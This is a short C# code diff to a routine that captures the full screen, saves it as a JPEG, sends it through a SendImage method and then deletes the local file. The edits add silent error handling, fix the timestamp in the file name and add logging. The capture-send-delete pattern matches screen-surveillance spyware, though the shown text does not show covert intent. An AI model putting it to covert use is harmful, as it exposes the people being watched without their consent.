@@ -49,12 +49,21 @@ namespace resource
             {
                 using (Graphics g = Graphics.FromImage(bitmap))
                 {
-                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    try
+                    {
+                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    }
+                    catch (Exception)
+                    {
+                        //Console.WriteLine("cannot catch screen.");
+                        //return false;
+                    }
                 }
                 string path = IMAGE_DIR;
-                string FileName = Path.Combine(path, DateTime.Now.ToString("yyyyddMHHmmss") + ".jpg");
+                string FileName = Path.Combine(path, DateTime.Now.ToString("yyyyMMddHHmmss") + ".jpg");
                 fullPathName = Path.GetFullPath(FileName);
                 bitmap.Save(fullPathName, ImageFormat.Jpeg);
+                Console.WriteLine($"fileName-->{fullPathName}");
                 SendImage(fullPathName);
                 File.Delete(fullPathName);
             }
